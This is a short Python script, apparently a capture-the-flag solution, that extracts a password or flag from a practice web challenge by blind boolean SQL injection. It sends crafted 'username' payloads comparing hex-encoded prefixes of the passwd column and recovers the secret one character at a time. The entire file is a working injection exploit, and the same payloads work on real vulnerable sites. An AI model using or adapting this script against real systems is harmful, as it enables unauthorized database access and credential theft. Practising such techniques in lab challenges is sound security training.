import requests
import string

url = "http://8e023c5a6336fedd.synctf.com:8002/sqlinject/sql14/index.php?username="
chars = "SYNCTF"+string.ascii_letters + string.digits + "{}!@#$_^%+=-.&*"
flag = ''
while True:
	if "}" in flag:
		break
	for char in chars:
		temp = flag + char
		payload = url + "'<(POSITION(hex('%s')in(hex(passwd)))=1)^'"%(temp)
		print(payload)
		req = requests.get(payload)
		if "username=admin" in req.text:
			flag += char
			print(flag)
			break